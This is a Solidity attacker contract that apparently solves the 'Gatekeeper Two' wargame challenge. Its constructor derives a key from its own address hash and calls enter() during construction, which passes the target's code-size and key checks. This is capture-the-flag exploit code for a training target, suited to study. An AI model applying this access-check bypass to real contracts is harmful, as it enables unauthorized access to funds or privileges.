// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

contract GatekeeperTwoAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool result,) = challengeInstance.call(abi.encodeWithSignature("enter(bytes8)",bytes8(key)));
    }
}